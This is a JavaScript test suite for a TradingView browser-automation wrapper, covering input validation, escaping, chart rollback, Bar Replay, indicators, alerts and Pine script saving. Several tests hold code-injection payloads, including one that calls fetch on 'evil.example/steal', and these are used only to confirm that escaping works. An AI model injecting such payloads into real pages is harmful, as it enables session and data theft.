import test from "node:test";
import assert from "node:assert/strict";
import vm from "node:vm";
import { TradingView } from "../../build/tradingview.js";

/** Fake CdpClient that records expressions instead of talking to a page. */
function fakeCdp(result = {}) {
  const calls = [];
  return {
    calls,
    evaluate(expression) {
      calls.push(expression);
      return Promise.resolve(result);
    },
  };
}

test("setSymbol embeds the symbol as a JSON string literal (no code injection)", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  const hostile = `BTC"); fetch("https://evil.example/steal"); ("`;
  await tv.setSymbol(hostile);

  const expr = cdp.calls[0];
  // the hostile payload must appear only in its escaped JSON form
  assert.ok(expr.includes(JSON.stringify(hostile)), "payload should be JSON-escaped");
  assert.ok(!expr.includes(`("${hostile}"`), "raw payload must not be spliced into code");
  // sanity: the escaped form neutralizes the quote that would break out of the literal
  assert.ok(!expr.includes(`BTC");`));
});

test("setResolution rejects strings that are not resolution-shaped", async () => {
  const tv = new TradingView(fakeCdp());
  for (const bad of ["", "1); hack(", "abc", "1D'; drop", "60m2"]) {
    assert.throws(() => tv.setResolution(bad), /resolution must look like/, bad);
  }
});

test("setResolution accepts typical TradingView resolutions", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  for (const ok of ["1", "5", "15", "60", "240", "1D", "1W", "1M", "D", "W"]) {
    await tv.setResolution(ok);
  }
  assert.equal(cdp.calls.length, 10);
});

test("setResolution targets an explicit chart index", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "15" });
  const tv = new TradingView(cdp);
  await tv.setResolution("15", 1);
  assert.match(cdp.calls[0], /window\.TradingViewApi\.chart\(1\)/);
  assert.throws(() => tv.setResolution("15", -1), /chartIndex must be/);
  assert.throws(() => tv.setResolution("15", 1.5), /chartIndex must be/);
});

test("setSymbol rejects empty input", () => {
  const tv = new TradingView(fakeCdp());
  assert.throws(() => tv.setSymbol(""), /non-empty/);
  assert.throws(() => tv.setSymbol("   "), /non-empty/);
});

test("setSymbol targets an explicit chart index", async () => {
  const cdp = fakeCdp({ symbol: "OANDA:EURUSD", resolution: "60", changed: true, bars: 10 });
  const tv = new TradingView(cdp);
  await tv.setSymbol("OANDA:EURUSD", 2);
  assert.ok(cdp.calls[0].includes("window.TradingViewApi.chart(2)"));
});

test("setSymbol/setResolution never report a non-matching state as success", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("clearTimeout(timer)"), "callback must cancel the timeout");
    assert.ok(expr.includes("did not take effect"), "non-matching state must reject");
    assert.ok(expr.includes("changed:") || expr.includes("changed "), "result must carry a changed flag");
    // both the callback and the timeout path must go through the same check
    assert.ok(expr.includes("settle(true)") && expr.includes("settle(false)"),
      "callback and timeout must share the verifying settle path");
    assert.ok(expr.includes("callback fired but chart shows"),
      "a callback with a non-matching state must reject too");
  }
  // symbol matching must tolerate exchange prefixes the page adds
  assert.ok(cdp.calls[0].includes('a.endsWith(":" + r)'));
  // resolution matching must normalize D/1D, W/1W, M/1M
  assert.ok(cdp.calls[1].includes('/^[SDWM]$/.test(u) ? "1" + u : u'));
});

test("setSymbol/setResolution reject when the chart has zero bars after the change", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("no data loaded (0 bars)"), "zero bars must reject");
    assert.ok(expr.includes("bars"), "result must report the bar count");
  }
});

test("setSymbol/setResolution roll the chart back before rejecting", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.setSymbol("BTCUSD");
  await tv.setResolution("240");
  const [symExpr, resExpr] = cdp.calls;
  for (const expr of [symExpr, resExpr]) {
    assert.ok(expr.includes("the chart was restored to"), "rollback success must be reported");
    assert.ok(expr.includes("WARNING: the chart could not be restored"), "rollback failure must warn");
    assert.ok(
      expr.match(/fail\(/g).length >= 2,
      "both failure branches must go through the rollback path",
    );
  }
  assert.ok(symExpr.includes("chart.setSymbol(before, finish)"), "symbol rollback uses the previous symbol");
  assert.ok(resExpr.includes("chart.setResolution(before, finish)"), "resolution rollback uses the previous timeframe");
});

test("Bar Replay status is read-only and normalizes watched values", async () => {
  const cdp = fakeCdp({ available: true, started: false });
  const result = await new TradingView(cdp).getReplayStatus();
  assert.equal(result.available, true);
  const expr = cdp.calls[0];
  assert.match(expr, /replay\.currentDate\(\)/);
  assert.match(expr, /typeof value\.value === "function"/);
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
});

test("startReplay validates and context-binds the requested historical instant", async () => {
  const tv = new TradingView(fakeCdp());
  assert.throws(
    () => tv.startReplay({ startAt: "not-a-date", expectedSymbol: "OANDA:EURUSD", expectedResolution: "60" }),
    /valid ISO-8601/,
  );
  assert.throws(
    () => tv.startReplay({ startAt: "2999-01-01T00:00:00.000Z", expectedSymbol: "OANDA:EURUSD", expectedResolution: "60" }),
    /must be in the past/,
  );
  assert.throws(
    () => tv.startReplay({ startAt: "2025-01-01T00:00:00.000Z", expectedSymbol: "", expectedResolution: "60" }),
    /expectedSymbol/,
  );

  const cdp = fakeCdp({ requestedStartAt: "2025-01-01T00:00:00.000Z", status: {} });
  const hostile = `OANDA:EURUSD"); fetch("https://evil.example/steal"); ("`;
  await new TradingView(cdp).startReplay({
    startAt: "2025-01-01T00:00:00.000Z",
    expectedSymbol: hostile,
    expectedResolution: "60",
  });
  const expr = cdp.calls[0];
  assert.ok(expr.includes(JSON.stringify(hostile)));
  assert.ok(!expr.includes(`const expectedSymbol = "${hostile}"`));
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
  assert.match(expr, /active chart symbol does not match expectedSymbol/);
  assert.match(expr, /replay\.selectDate\(1735689600000\)/);
  assert.match(expr, /Bar Replay did not start within 20 seconds/);
  assert.match(expr, /await replay\.stopReplay\(\)/);
  assert.match(expr, /and cleanup also failed/);
});

test("startReplay cleans up a partially opened toolbar when date selection fails", async () => {
  let expr = "";
  const cdp = { evaluate: async (value) => { expr = value; return {}; } };
  await new TradingView(cdp).startReplay({
    startAt: "2025-01-01T00:00:00.000Z",
    expectedSymbol: "OANDA:EURUSD",
    expectedResolution: "60",
  });
  const state = { toolbar: false, started: false };
  let stopCalls = 0;
  const watched = (read) => ({ value: read });
  const replay = {
    currentDate: () => watched(() => null),
    getReplaySelectedDate: () => watched(() => null),
    replayResolutions: () => watched(() => []),
    currentReplayResolution: () => watched(() => null),
    autoReplayResolution: () => watched(() => "60"),
    isReplayAvailable: () => watched(() => true),
    isReplayToolbarVisible: () => watched(() => state.toolbar),
    isReplayStarted: () => watched(() => state.started),
    isReadyToPlay: () => watched(() => false),
    isAutoplayStarted: () => watched(() => false),
    isJumpToBarModeEnabled: () => watched(() => false),
    autoplayDelay: () => 1000,
    selectDate: async () => {
      state.toolbar = true;
      throw new Error("select failed");
    },
    stopReplay: async () => {
      stopCalls += 1;
      state.toolbar = false;
      state.started = false;
    },
  };
  const context = {
    window: {
      TradingViewApi: {
        replayApi: async () => replay,
        activeChart: () => ({ symbol: () => "OANDA:EURUSD", resolution: () => "60" }),
        activeChartIndex: () => 0,
      },
    },
    Date,
    setTimeout,
  };
  await assert.rejects(vm.runInNewContext(expr, context), /select failed/);
  assert.equal(stopCalls, 1);
  assert.equal(state.toolbar, false);
});

test("stepReplay is bounded, paused-only, and verifies time advancement", async () => {
  const tv = new TradingView(fakeCdp());
  for (const bad of [0, 101, 1.5]) assert.throws(() => tv.stepReplay(bad), /steps must be/);
  const cdp = fakeCdp({ requestedSteps: 3, completedSteps: 3, reachedEnd: false });
  await new TradingView(cdp).stepReplay(3);
  const expr = cdp.calls[0];
  assert.match(expr, /pause Bar Replay autoplay before stepping/);
  assert.match(expr, /await replay\.doStep\(\)/);
  assert.match(expr, /current\.currentTime !== prior/);
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition|toggleAutoplay)\(/);
});

test("stopReplay closes the toolbar and verifies real-time mode", async () => {
  const cdp = fakeCdp({ changed: true, before: {}, after: {} });
  await new TradingView(cdp).stopReplay();
  const expr = cdp.calls[0];
  assert.match(expr, /await replay\.stopReplay\(\)/);
  assert.match(expr, /Bar Replay did not stop within 10 seconds/);
  assert.doesNotMatch(expr, /replay\.(?:buy|sell|closePosition)\(/);
});

test("getOhlcv bars carry timeIso and a forming flag heuristic", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
  const tv = new TradingView(cdp);
  await tv.getOhlcv(5);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("toISOString()"), "bars must include ISO time");
  assert.ok(expr.includes("bar.forming = true"), "last forming bar must be flagged");
  // minutes, seconds, day, week, month resolutions must all be handled
  assert.ok(expr.includes("{ S: 1, D: 86400, W: 604800, M: 2592000 }"));
});

test("getIndicatorValues bars carry timeIso", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ count: 3 });
  assert.ok(cdp.calls[0].includes("toISOString()"));
});

test("getChartContext exposes study ids alongside names", async () => {
  const cdp = fakeCdp({ charts: [] });
  const tv = new TradingView(cdp);
  await tv.getChartContext();
  assert.ok(
    cdp.calls[0].includes("({ id: s.id, name: s.name })"),
    "studies must include the id used by get_indicator_* tools",
  );
});

test("getOhlcv validates count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getOhlcv(NaN), /count must be/);
  assert.throws(() => tv.getOhlcv(0), /count must be/);
  assert.throws(() => tv.getOhlcv(-5), /count must be/);
  assert.throws(() => tv.getOhlcv(Infinity), /count must be/);
  assert.throws(() => tv.getOhlcv(10, 1.5), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, -1), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, "1); hack("), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getOhlcv floors fractional counts and targets the right chart", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
  const tv = new TradingView(cdp);
  await tv.getOhlcv(10.9, 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("slice(-10)"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");

  await tv.getOhlcv(5);
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

test("getIndicatorValues validates studyId, count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  for (const badId of ['"); hack(); ("', "a b", "x".repeat(65), "évil", ""]) {
    assert.throws(() => tv.getIndicatorValues({ studyId: badId }), /studyId must match/, badId);
  }
  assert.throws(() => tv.getIndicatorValues({ count: 0 }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ count: NaN }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorValues embeds studyId as a JSON literal and honors options", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ studyId: "mlahPw", count: 5.9, chartIndex: 1, includeAllPlots: true });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"mlahPw"'), "studyId should be quoted");
  assert.ok(expr.includes("const maxBars = 5"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(expr.includes("const includeAllPlots = true"));

  await tv.getIndicatorValues();
  const expr2 = cdp.calls[1];
  assert.ok(expr2.includes("const studyIdFilter = null"), "default is all studies");
  assert.ok(expr2.includes("api.activeChart()"), "default is active chart");
  assert.ok(expr2.includes("const includeAllPlots = false"));
});

test("getIndicatorValues excludes plotcandle's ohlc_* mirror plots by default", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("/^ohlc_/"), "ohlc_* plot types must be treated as noise");
  assert.ok(
    expr.includes('type === "alertcondition"') && expr.includes('type === "textcolor"'),
    "existing noise types must still be excluded",
  );
});

test("getIndicatorInputs validates ids and always excludes Pine-internal inputs", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorInputs({ studyId: '1"; steal()' }), /studyId must match/);
  assert.equal(cdp.calls.length, 0);

  await tv.getIndicatorInputs({ studyId: "XfUjdm" });
  const expr = cdp.calls[0];
  for (const hidden of ["text", "pineId", "pineVersion", "pineFeatures"]) {
    assert.ok(expr.includes(`"${hidden}"`), `HIDDEN set must contain ${hidden}`);
  }
  assert.ok(expr.includes("truncated"), "long string values must be truncated");
});

test("setIndicatorInput validates before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.setIndicatorInput('"); hack(', [{ id: "in_0", value: 1 }]), /studyId must match/);
  assert.throws(() => tv.setIndicatorInput("st1", []), /non-empty array/);
  assert.throws(() => tv.setIndicatorInput("st1", Array(21).fill({ id: "in_0", value: 1 })), /at most 20/);
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: '"); hack(', value: 1 }]), /invalid input id/);
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: "pineId", value: "x" }]), /internal.*cannot be set/);
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: "text", value: "x" }]), /internal.*cannot be set/);
  assert.throws(
    () => tv.setIndicatorInput("st1", [{ id: "in_0", value: { nested: true } }]),
    /must be a number, string or boolean/,
  );
  assert.throws(() => tv.setIndicatorInput("st1", [{ id: "in_0", value: 1 }], { chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("setIndicatorInput writes via the generic study API and verifies the id exists first", async () => {
  const cdp = fakeCdp({ studyId: "st1", applied: [{ id: "in_0", name: "Length", value: 14 }] });
  const tv = new TradingView(cdp);
  await tv.setIndicatorInput("st1", [{ id: "in_0", value: 14 }], { chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"st1"'), "studyId quoted as JSON");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(expr.includes("studyApi.setInputValues(inputs)"), "must use the generic study setter");
  assert.ok(expr.includes("has no input with id"), "unknown ids must be rejected on the page too");
  assert.ok(!/save|delete|method:\s*["']POST/.test(expr), "must never write to pine-facade");

  await tv.setIndicatorInput("st1", [{ id: "in_0", value: 14 }]);
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

/**
 * Execute the setIndicatorInput page expression under a virtual clock so the
 * settle loop's timing can be tested without real waits. `reportAt` is a list
 * of [virtualMs, reportId] describing when activeStrategyReportData swaps its
 * identity; `loadingUntil` keeps studyApi.isLoading() true before that time.
 * Returns the expression result plus the virtual time at which it read the
 * inputs back (i.e. when the settle loop declared the recalculation finished).
 */
async function runSettleLoop(inputs, { reportAt = [], loadingUntil = 0 } = {}) {
  let expr;
  const cdp = { evaluate: (e) => ((expr = e), Promise.resolve({})) };
  await new TradingView(cdp).setIndicatorInput("st1", inputs);

  let now = 0;
  let settledAt = null;
  let inputReads = 0;
  const studyApi = {
    getInputValues() {
      inputReads += 1;
      if (inputReads > 1) settledAt = now; // second read happens after the settle loop
      return inputs.map((inp) => ({ id: inp.id, value: inp.value }));
    },
    setInputValues() {},
    getInputsInfo: () => [],
    isLoading: () => now < loadingUntil,
  };
  const bt = {
    activeStrategyReportData: {
      value() {
        let report = "r0";
        for (const [t, id] of reportAt) if (now >= t) report = id;
        return report;
      },
    },
  };
  const context = vm.createContext({
    window: {
      TradingViewApi: {
        activeChart: () => ({ getStudyById: () => studyApi }),
        backtestingStrategyApi: async () => bt,
      },
    },
    Date: { now: () => now },
    setTimeout: (fn, ms) => {
      now += ms;
      queueMicrotask(fn);
    },
  });
  const result = await vm.runInContext(expr, context);
  return { settledAt, result };
}

test("setIndicatorInput multi-input settle outlasts a lagging second recalculation", async () => {
  // Regression for the race observed 2026-07-10: two inputs changed in one
  // call, the first recalc swapped the report at 500ms, the final one only at
  // 1800ms. The old 1000ms quiet window settled at ~1750ms and handed back
  // the intermediate (stale) strategy report.
  const { settledAt, result } = await runSettleLoop(
    [{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }],
    { reportAt: [[500, "r1"], [1800, "r2"]] },
  );
  assert.ok(settledAt >= 1800, `must settle after the final recalc, settled at ${settledAt}ms`);
  assert.equal(result.settled, true, "a clean settle must be reported as settled");
  assert.equal(result.warning, undefined, "a clean settle must carry no warning");
});

test("setIndicatorInput never settles while the study still reports loading", async () => {
  const { settledAt, result } = await runSettleLoop(
    [{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }],
    { reportAt: [[500, "r1"]], loadingUntil: 3000 },
  );
  assert.ok(settledAt >= 3000, `must wait for isLoading to clear, settled at ${settledAt}ms`);
  assert.equal(result.settled, true);
});

test("setIndicatorInput single-input settle keeps the fast path", async () => {
  const { settledAt } = await runSettleLoop(
    [{ id: "in_0", value: 20 }],
    { reportAt: [[500, "r1"]] },
  );
  assert.ok(settledAt >= 1500, `must wait a quiet window after the recalc, settled at ${settledAt}ms`);
  assert.ok(settledAt <= 3000, `single input must not pay the multi-input wait, settled at ${settledAt}ms`);
});

test("setIndicatorInput plain-indicator no-signal timeout still terminates", async () => {
  const single = await runSettleLoop([{ id: "in_0", value: 20 }]);
  assert.ok(single.settledAt > 3000 && single.settledAt <= 4000,
    `single input no-signal exit, settled at ${single.settledAt}ms`);
  assert.equal(single.result.settled, true, "a quiet no-signal exit counts as settled");
  const multi = await runSettleLoop([{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }]);
  assert.ok(multi.settledAt > 5000 && multi.settledAt <= 6000,
    `multi input no-signal exit, settled at ${multi.settledAt}ms`);
});

test("setIndicatorInput reports settled:false when still loading at the 20s deadline", async () => {
  const { settledAt, result } = await runSettleLoop(
    [{ id: "in_0", value: 20 }, { id: "in_1", value: 20 }],
    { reportAt: [[500, "r1"]], loadingUntil: 30000 },
  );
  assert.ok(settledAt >= 20000, `must hold until the deadline, settled at ${settledAt}ms`);
  assert.equal(result.settled, false, "a deadline exit must not be reported as settled");
  assert.match(result.warning, /still recalculating/, "must warn that dependent reads may be stale");
  assert.equal(result.applied.length, 2, "applied values are still returned");
});

test("getIndicatorGraphics validates inputs before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorGraphics({ studyId: '"); hack(' }), /studyId must match/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 0 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 501 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ limitPerKind: 2.5 }), /limitPerKind must be/);
  assert.throws(() => tv.getIndicatorGraphics({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);
});

test("getIndicatorGraphics reads both raw and materialized primitive stores", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorGraphics({ studyId: "lSZ7z5", limitPerKind: 10 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"lSZ7z5"'), "studyId quoted as JSON");
  for (const kind of ["dwglabels", "dwglines", "dwgboxes"]) {
    assert.ok(expr.includes(kind), `must read ${kind}`);
  }
  assert.ok(expr.includes("_primitivesDataById"), "raw store");
  assert.ok(expr.includes("_primitiveById"), "materialized store");
  assert.ok(expr.includes("const limit = 10"));
});

test("getIndicatorTables validates inputs before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorTables({ studyId: '"); hack(' }), /studyId must match/);
  assert.throws(() => tv.getIndicatorTables({ studyId: "a b" }), /studyId must match/);
  assert.throws(() => tv.getIndicatorTables({ chartIndex: -1 }), /chartIndex must be/);
  assert.throws(() => tv.getIndicatorTables({ chartIndex: 1.5 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorTables reads both table stores and reconstructs grids safely", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorTables({ studyId: "mlahPw", chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"mlahPw"'), "studyId quoted as JSON");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  for (const kind of ["dwgtables", "dwgtablecells"]) {
    assert.ok(expr.includes(kind), `must read ${kind}`);
  }
  // dwgtablecells stores are NOT nested like the other kinds — both shapes
  // must be handled, and both raw and materialized stores read
  assert.ok(expr.includes("isStore(inner)"), "outer values may be stores themselves");
  assert.ok(expr.includes("_primitivesDataById"), "raw store");
  assert.ok(expr.includes("_primitiveById"), "materialized store");
  assert.ok(expr.includes("truncated"), "cell text must be truncated");
  assert.ok(expr.includes("MAX_GRID_CELLS"), "grid size must be capped");
  assert.ok(expr.includes("grid[c.row][c.column] = c.text"), "grid keyed by row/column");

  await tv.getIndicatorTables();
  assert.ok(cdp.calls[1].includes("const studyIdFilter = null"), "default is all studies");
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

test("loadMoreHistory validates count and builds a requestMoreData call", async () => {
  const cdp = fakeCdp({ requested: 1, barsBefore: 0, barsAfter: 0, added: 0, earliestTime: null, moreAvailable: null });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.loadMoreHistory({ count: 0 }), /count must be/);
  assert.throws(() => tv.loadMoreHistory({ count: 5001 }), /count must be/);
  assert.throws(() => tv.loadMoreHistory({ count: 1.5 }), /count must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.loadMoreHistory({ count: 250, chartIndex: 1 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes("requestMoreData(requested)"));
  assert.ok(expr.includes("const requested = 250"));
  assert.ok(expr.includes("api.chart(1)"));
});

test("listAlerts fetches the alerts API read-only with the app session", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.listAlerts();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pricealerts.tradingview.com/list_alerts"));
  assert.ok(expr.includes('credentials: "include"'));
  assert.ok(!/create_alert|modify|delete/.test(expr), "must stay read-only");
});

test("createPriceAlert posts a bounded non-webhook alert and verifies readback", async () => {
  const cdp = fakeCdp({
    requestId: 9,
    alertId: 10,
    name: "BUSHIDO-MCP:0123456789abcdef:confirmation",
    symbol: "OANDA:USDJPY",
    resolution: "240",
    operator: "cross_up",
    level: 162.3,
    expiration: "2099-01-01T00:00:00.000Z",
    verified: true,
  });
  const tv = new TradingView(cdp);
  const result = await tv.createPriceAlert({
    symbol: "OANDA:USDJPY",
    resolution: "240",
    operator: "cross_up",
    level: 162.3,
    expiration: "2099-01-01T00:00:00.000Z",
    name: "BUSHIDO-MCP:0123456789abcdef:confirmation",
    message: "Bushido confirmation",
    mobilePush: true,
    popup: true,
    playSound: false,
  });
  assert.equal(result.verified, true);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pricealerts.tradingview.com/create_alert"));
  assert.ok(expr.includes('method: "POST"'));
  assert.ok(expr.includes("JSON.stringify({ payload })"));
  assert.ok(expr.includes("cross_interval: true"));
  assert.ok(expr.includes('created.s !== "ok"'));
  assert.ok(expr.includes("https://pricealerts.tradingview.com/list_alerts"));
  assert.ok(expr.includes("web_hook: null"));
  assert.ok(expr.includes("email: false"));
  assert.ok(expr.includes("sms_over_email: false"));
  assert.ok(!expr.includes("modify_restart_alert"));
  assert.ok(!expr.includes("delete_alerts"));
});

test("createPriceAlert validates ownership and values before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.createPriceAlert({
    symbol: "OANDA:USDJPY",
    resolution: "240",
    operator: "cross_up",
    level: 162.3,
    expiration: "2099-01-01T00:00:00.000Z",
    name: "not-owned",
    message: "x",
    mobilePush: false,
    popup: false,
    playSound: false,
  }), /ownership label/);
  assert.equal(cdp.calls.length, 0);
});

test("listPineScripts fetches saved scripts read-only and cross-references charts", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.listPineScripts();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://pine-facade.tradingview.com/pine-facade/list/?filter=saved"));
  assert.ok(expr.includes('credentials: "include"'), "must use the logged-in session");
  assert.ok(expr.includes('v.id === "pineId"'), "must map scripts to on-chart studies");
  assert.ok(expr.includes('v.id === "pineVersion"'), "must expose each on-chart instance version");
  assert.ok(!/\/save|\/delete|\/new|method:/i.test(expr), "must stay read-only GET");
  // the list must apply the exact same USER;-only gate as getPineSource, so
  // nothing listed can ever be refused by the source tool
  assert.ok(expr.includes('"^USER;[\\\\w]{8,64}$"'), "list must filter by the shared pine id pattern");
  assert.ok(expr.includes("PINE_ID.test(s.scriptIdPart)"));
});

test("getPineSource accepts only own USER;… ids and validates before the page", async () => {
  const cdp = fakeCdp({ source: "//@version=5" });
  const tv = new TradingView(cdp);
  for (const bad of [
    "PUB;abcdef1234567890", // third-party published script
    "USER;short",
    'USER;abc12345"); hack(); ("',
    "USER;",
    "",
    "adc40b1dfee344f19412f1ae9af74f3f",
  ]) {
    assert.throws(() => tv.getPineSource(bad), /pineId must look like/, bad);
  }
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");

  await tv.getPineSource("USER;adc40b1dfee344f19412f1ae9af74f3f");
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"USER;adc40b1dfee344f19412f1ae9af74f3f"'), "pineId quoted as JSON");
  assert.ok(expr.includes("encodeURIComponent(pineId)"), "id must be URL-encoded");
  assert.ok(expr.includes("https://pine-facade.tradingview.com/pine-facade/get/"));
  assert.ok(expr.includes('credentials: "include"'));
  assert.ok(!/\/save|\/delete|\/new|method:/i.test(expr), "must stay read-only GET");
});

test("savePineScript validates inputs before touching the page", async () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  await assert.rejects(() => tv.savePineScript({ source: "" }), /non-empty string/);
  await assert.rejects(() => tv.savePineScript({ source: "   " }), /non-empty string/);
  await assert.rejects(() => tv.savePineScript({ source: "x".repeat(200_001), name: "n" }), /too large/);
  await assert.rejects(
    () => tv.savePineScript({ source: "plot(close)", pineId: "PUB;abcdef1234567890" }),
    /pineId must look like/,
  );
  await assert.rejects(() => tv.savePineScript({ source: "plot(close)" }), /name is required/);
  await assert.rejects(
    () => tv.savePineScript({ source: "plot(close)", name: "x".repeat(101) }),
    /at most 100/,
  );
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("savePineScript without confirm is a dry run that writes nothing", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const dry = await tv.savePineScript({ source: "//@version=5\nplot(close)", name: "New Script" });
  assert.equal(dry.dryRun, true);
  assert.equal(dry.action, "create_new");
  assert.match(dry.note, /DRY RUN/);
  assert.equal(cdp.calls.length, 0, "create_new dry run must not touch the page at all");

  const cdp2 = fakeCdp({ pineId: "USER;adc40b1dfee344f19412f1ae9af74f3f", name: "Old", version: "3.0", sourceLength: 100, source: "old" });
  const tv2 = new TradingView(cdp2);
  const dry2 = await tv2.savePineScript({
    source: "//@version=5\nplot(close)",
    pineId: "USER;adc40b1dfee344f19412f1ae9af74f3f",
  });
  assert.equal(dry2.dryRun, true);
  assert.equal(dry2.action, "new_version");
  assert.equal(dry2.currentVersion, "3.0");
  assert.equal(dry2.currentSourceLength, 100);
  assert.equal(cdp2.calls.length, 1, "only the current source is fetched");
  assert.ok(cdp2.calls[0].includes("pine-facade/get/"), "dry run reads, never writes");
  assert.ok(!/save\/(new|next)|saveNew|saveNext/.test(cdp2.calls[0]), "no save call in a dry run");
});

test("savePineScript with confirm saves non-destructively and verifies", async () => {
  const cdp = fakeCdp({ dryRun: false });
  const tv = new TradingView(cdp);
  await tv.savePineScript({ source: "//@version=5\nplot(close)", name: "New Script", confirm: true });
  const create = cdp.calls[0];
  assert.ok(
    create.includes("lib.saveNew({ scriptSource: source, scriptName: name })"),
    "new scripts use saveNew without the overwrite option",
  );
  assert.ok(create.includes("already exists"), "duplicate names must be detected up front");
  assert.ok(create.includes('"New Script"'), "name quoted as JSON");
  assert.ok(create.includes("/last"), "result is verified by fetching the saved version back");
  assert.ok(create.includes("pine-facade save failed"), "string rejections must become real errors");

  await tv.savePineScript({
    source: "//@version=5\nplot(close)",
    pineId: "USER;adc40b1dfee344f19412f1ae9af74f3f",
    confirm: true,
  });
  const next = cdp.calls[1];
  assert.ok(next.includes("lib.saveNext"), "existing scripts get a new version");
  assert.ok(next.includes("isLegacyScript: false"));
  assert.ok(next.includes('"USER;adc40b1dfee344f19412f1ae9af74f3f"'), "pineId quoted as JSON");
  assert.ok(next.includes("revertHint") && next.includes("get_pine_source"),
    "a broken save must explain how to revert");
});

test("addPineToChart validates and only ever adds studies", async () => {
  const cdp = fakeCdp({ studyId: "x", name: null, isStrategy: false, chartIndex: null });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.addPineToChart("PUB;abcdef1234567890"), /pineId must look like/);
  assert.throws(() => tv.addPineToChart("USER;adc40b1dfee344f19412f1ae9af74f3f", -1), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.addPineToChart("USER;adc40b1dfee344f19412f1ae9af74f3f", 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes('{ type: "pine", pineId, version: "last" }'), "insert by pine descriptor");
